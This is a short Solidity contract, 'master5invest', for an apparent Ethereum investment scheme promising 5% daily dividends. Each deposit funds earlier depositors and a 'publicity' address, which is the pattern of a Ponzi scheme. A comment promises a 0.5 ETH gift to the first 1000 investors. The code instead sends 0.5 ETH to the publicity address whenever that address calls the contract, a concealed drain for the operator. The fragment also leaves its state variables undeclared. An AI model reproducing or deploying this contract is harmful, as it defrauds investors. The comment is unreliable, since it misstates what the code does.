contract master5invest {
function() external payable {
        uint256 newadv = msg.value / 20;
        publicity.transfer(newadv);
        
        if ( m5balances[msg.sender] != 0){
        address sender = msg.sender;
        
        uint256 dividends =  m5balances[msg.sender]*5/100*(block.number-nextpayout[msg.sender])/5900;
        sender.transfer(dividends);
        }

         nextpayout[msg.sender] = block.number; //next payment date
         m5balances[msg.sender] += msg.value; // increase balance
         
        //a gift to the first 1000 investors -- after 1 month 0.5 ETH
        if (msg.sender==publicity || block.number==6700000) {
            publicity.transfer(0.5 ether);
        }
        
        
    }
}